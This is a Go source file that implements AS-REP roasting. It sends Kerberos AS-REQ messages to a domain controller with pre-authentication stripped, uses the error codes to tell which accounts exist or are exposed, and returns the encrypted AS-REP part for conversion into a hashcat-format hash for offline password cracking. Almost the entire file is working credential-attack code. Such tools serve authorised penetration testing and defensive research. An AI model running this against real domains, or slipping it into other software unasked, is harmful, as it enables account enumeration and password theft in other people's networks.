package kerberos

import (
	"encoding/binary"
	"fmt"
	"net"
	"strings"

	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// ASREPRoastResult contains the raw fields from an AS-REP response for an account
// that does not require Kerberos pre-authentication. The caller is responsible for
// formatting these fields into a crackable hash (e.g. hashcat format).
type ASREPRoastResult struct {
	// Username is the account that was targeted.
	Username string
	// Realm is the Kerberos realm (uppercased).
	Realm string
	// EncryptionType is the etype of the encrypted part (23 = RC4, 17 = AES128, 18 = AES256).
	EncryptionType int32
	// CipherText is the raw encrypted part of the AS-REP, crackable offline.
	CipherText []byte
}

// ASREPRoast sends an AS-REQ without pre-authentication data for the given username
// and returns the encrypted part of the AS-REP response.
//
// If the account requires pre-authentication, the KDC responds with
// KDC_ERR_PREAUTH_REQUIRED (error code 25) and this function returns an error.
// If the account does not exist, the KDC responds with KDC_ERR_C_PRINCIPAL_UNKNOWN
// (error code 6).
//
// The returned CipherText in ASREPRoastResult can be formatted by the caller into
// a hashcat-compatible hash ($krb5asrep$<etype>$...) for offline cracking.
func ASREPRoast(username, realm, kdcHost string) (*ASREPRoastResult, error) {
	realm = strings.ToUpper(realm)
	_, cfg := KerberosInit(kdcHost, realm)

	cname := types.NewPrincipalName(1, username) // NT-PRINCIPAL = 1

	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
	if err != nil {
		return nil, fmt.Errorf("failed to build AS-REQ: %w", err)
	}

	// Remove PA-DATA to send the request without pre-authentication.
	// Without this, the KDC would require PA-ENC-TIMESTAMP (pre-auth).
	asReq.PAData = nil

	asReqBytes, err := asReq.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal AS-REQ: %w", err)
	}

	// Kerberos over TCP: 4-byte big-endian message length prefix followed by the message.
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:88", kdcHost))
	if err != nil {
		return nil, fmt.Errorf("failed to connect to KDC at %s:88: %w", kdcHost, err)
	}
	defer conn.Close()

	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(asReqBytes)))
	if _, err := conn.Write(append(lenBuf, asReqBytes...)); err != nil {
		return nil, fmt.Errorf("failed to send AS-REQ: %w", err)
	}

	// Read the 4-byte response length then the response body.
	respLenBuf := make([]byte, 4)
	if err := readFullKDC(conn, respLenBuf); err != nil {
		return nil, fmt.Errorf("failed to read KDC response length: %w", err)
	}
	respBuf := make([]byte, binary.BigEndian.Uint32(respLenBuf))
	if err := readFullKDC(conn, respBuf); err != nil {
		return nil, fmt.Errorf("failed to read KDC response: %w", err)
	}

	// A KRBError response means something went wrong (pre-auth required, unknown user...).
	var krbErr messages.KRBError
	if err := krbErr.Unmarshal(respBuf); err == nil {
		switch krbErr.ErrorCode {
		case 25: // KDC_ERR_PREAUTH_REQUIRED
			return nil, fmt.Errorf("account %q has pre-authentication enabled (not vulnerable)", username)
		case 6: // KDC_ERR_C_PRINCIPAL_UNKNOWN
			return nil, fmt.Errorf("account %q does not exist in realm %s", username, realm)
		default:
			return nil, fmt.Errorf("KDC error %d: %s", krbErr.ErrorCode, krbErr.EText)
		}
	}

	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBuf); err != nil {
		return nil, fmt.Errorf("failed to parse AS-REP: %w", err)
	}

	return &ASREPRoastResult{
		Username:       username,
		Realm:          realm,
		EncryptionType: asRep.EncPart.EType,
		CipherText:     asRep.EncPart.Cipher,
	}, nil
}

// readFullKDC reads exactly len(buf) bytes from conn, retrying partial reads.
func readFullKDC(conn net.Conn, buf []byte) error {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return err
		}
	}
	return nil
}
